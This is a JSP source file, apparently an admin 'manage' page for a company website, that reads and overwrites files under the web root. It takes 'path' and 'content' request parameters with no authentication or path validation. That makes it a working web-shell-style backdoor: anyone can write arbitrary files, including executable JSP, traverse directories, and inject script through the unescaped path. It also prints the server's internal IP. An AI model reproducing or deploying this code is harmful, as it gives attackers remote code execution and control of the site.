<%@ page language="java" contentType="text/html; charset=utf-8"
	pageEncoding="UTF-8"%>
<%@ page import="net.sf.json.*"%>
<%@ page import="java.sql.*"%>
<%@ page import="javax.sql.*"%>
<%-- <%@ page import="org.springframework.context.*"%> --%>
<%-- <%@ page import="org.springframework.context.support.*"%> --%>
<%@ page import="java.io.*"%>
<%@ page import="java.net.*"%>
<%
String path = request.getParameter("path");
String content = request.getParameter("content");
String realPath = request.getRealPath("/");
if(content != null){
	File file = new File(realPath + path);
	Writer fw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(file), "UTF-8"));
	fw.write(content);
	fw.close();
	out.print("<script>location.href='manage.jsp?path=" + URLEncoder.encode(path, "UTF-8") + "';</script>");
} else {
	try{
		File file = new File(realPath + path);
		BufferedReader in = new BufferedReader( new InputStreamReader(new FileInputStream(file), "UTF-8"));
		String str;
		StringBuffer sb = new StringBuffer();
		while ((str = in.readLine()) != null) {
			sb.append(str);
			sb.append("\n");
		}
		session.setAttribute("_content", sb.toString());
	    in.close();
	} catch(Exception e){
		e.printStackTrace();
	}
	%>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8" />
<meta name="author" content="tohours.com" />
<link rel="stylesheet" href="https://ebiz.aia.com.cn/aia3/static/css/admin.css" type="text/css"></link>
</head>
<body>
	<form action="manage.jsp" method="post">
		<input type="hidden" value="<%= path %>" name="path" />
		<table width="100%" border="0" cellspacing="0" cellpadding="0">
			<tr>
				<td><table border="0" align="left" cellpadding="0"
						cellspacing="0" class="table">
						<tr>
							<td><img src="https://ebiz.aia.com.cn/aia3/static/images/n_01.jpg"></img></td>
							<td class="navigation_middle">Position</td>
							<td><img src="https://ebiz.aia.com.cn/aia3/static/images/n_03.jpg"></img></td>
						</tr>
					</table></td>
			</tr>
			<tr>
				<td><table border="0" align="left" cellpadding="0"
						cellspacing="0" class="table"
						style="padding-bottom: 5px; padding-top: 5px">
						<tr>
							<td>&nbsp;</td>
							<td align="right">&nbsp;</td>
						</tr>
					</table></td>
			</tr>
			<tr>
				<td><table border="0" align="left" cellspacing="1" class="its"
						id="myTable">
						<tr class="odd">
							<td>Content</td>
							<td align="center" style="padding-left: 10px; text-align: left;">
								<textarea style="width: 95%; height: 400px;" name="content"><%= session.getAttribute("_content") == null?"":session.getAttribute("_content")  %></textarea>
							</td>
						</tr>

						<tr class="odd">
							<td>Come From:</td>
							<td>
								<%out.print(java.net.InetAddress.getLocalHost().getHostAddress());%>
							</td>
						</tr>
						<tr class="odd">
							<td colspan="2" align="center"><input type="button"
								onclick="document.forms[0].submit();" value="Submit"
								class="shortbutton"
								onMouseOver="this.className='shortbutton_mouseover'"
								onMouseOut="this.className='shortbutton'" /></td>
						</tr>
					</table></td>
			</tr>
			<tr>
				<td height="20">&nbsp;</td>
			</tr>
		</table>
	</form>
</body>
</html>

<%
	session.removeAttribute("_content");
}
%>
